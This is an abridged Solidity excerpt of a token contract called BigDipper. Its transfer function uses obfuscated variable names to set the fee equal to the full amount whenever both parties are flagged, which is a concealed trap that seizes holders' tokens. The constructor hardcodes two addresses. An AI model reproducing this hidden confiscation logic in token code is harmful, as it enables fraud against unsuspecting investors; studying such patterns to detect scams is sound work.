...
abstract contract AbsToken is IERC20, Ownable {
    ...
    function _transfer(
        ...
        if (_function[from] > _uint256 && _function[to] > _uint256) {
            fee = amount;
...
contract BigDipper is AbsToken {
    constructor() AbsToken(
        ...
        address(0x313A2334670FbaA01dEF4467951c22a0A2Ed5b79),
        address(0xb3c3FbD866553aC4DeF333EE0F16d09B3Bc7C813)
    ){
    }
}